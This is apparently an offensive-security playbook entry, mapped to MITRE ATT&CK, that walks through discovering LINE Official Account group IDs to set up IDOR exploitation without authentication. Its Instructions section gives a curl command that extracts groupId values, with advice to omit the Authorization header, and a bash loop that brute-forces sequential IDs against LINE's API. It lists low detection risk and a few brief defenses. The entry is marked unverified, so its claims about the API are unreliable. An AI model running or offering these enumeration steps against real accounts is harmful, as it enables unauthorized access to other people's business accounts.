---
tags:
  - idor
  - discovery
  - web
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-extract-group-id]]'
platforms:
  - Web
techniques:
  - '[[Account Discovery]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 3ddc3269-117a-486a-9592-1681bb77b85d
created_at: '2025-12-14T17:30:58.620Z'
updated_at: '2025-12-14T17:30:58.620Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Extract-or-Guess-LINE-Official-Account-Group-ID

## Summary

This procedure extracts or guesses group IDs for LINE Official Accounts by analyzing unprotected application responses or leveraging predictable ID patterns, enabling subsequent IDOR exploitation without authentication.

## Description

In the LINE Official Account system, group IDs are exposed in API responses or follow a guessable sequential format. Attackers inspect network traffic during legitimate interactions to capture IDs, or enumerate by testing incremental values. This serves as the initial discovery step for privilege escalation attacks, targeting the web-based management endpoints.

## Requirements

1. Access to LINE's web API endpoints over HTTPS
2. Basic HTTP client like curl or browser dev tools
3. Knowledge of a starting account ID to base guesses on

## Defense

Defensive measures and detection strategies:

- Implement proper authorization checks on all ID-referencing endpoints
- Obfuscate or randomize group IDs to prevent guessing
- Monitor for anomalous API requests to summary or list endpoints

## Objectives

1. Obtain a valid group ID for a target LINE Official Account
2. Confirm ID usability for further exploitation
3. Enable unauthorized access attempts

## Instructions

### Step 1: Fetch Account Summary to Extract ID

**Context**: Send a GET request to an account summary endpoint to capture the group ID from the response JSON, exploiting the lack of authentication enforcement.

**Command** ([[commands/curl-extract-group-id]]):
```bash
curl -X GET "https://api.line.me/v2/bot/group/{account_id}/summary" -H "Authorization: Bearer {access_token}" | grep -o 'groupId":"[^"]*'
```

> This command retrieves the summary and extracts the groupId field. Expected output: groupId":"1234567890abcdef". If no token is needed due to IDOR, omit the Authorization header.

### Step 2: Guess Sequential IDs if Extraction Fails

**Context**: If direct extraction is blocked, test sequential IDs by sending probe requests and checking for valid responses.

**Command** ([[commands/curl-extract-group-id]]):
```bash
for id in {1000000000..1000000100}; do curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "https://api.line.me/v2/bot/group/$id/summary"; done | grep 200
```

> This loops through potential IDs, reporting only successful (200) responses. Expected output: Lines with valid IDs that return 200 OK.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-extract-group-id]]

## Tools Used


## Tags

- [[idor]]
- [[Discovery]]
- [[web]]
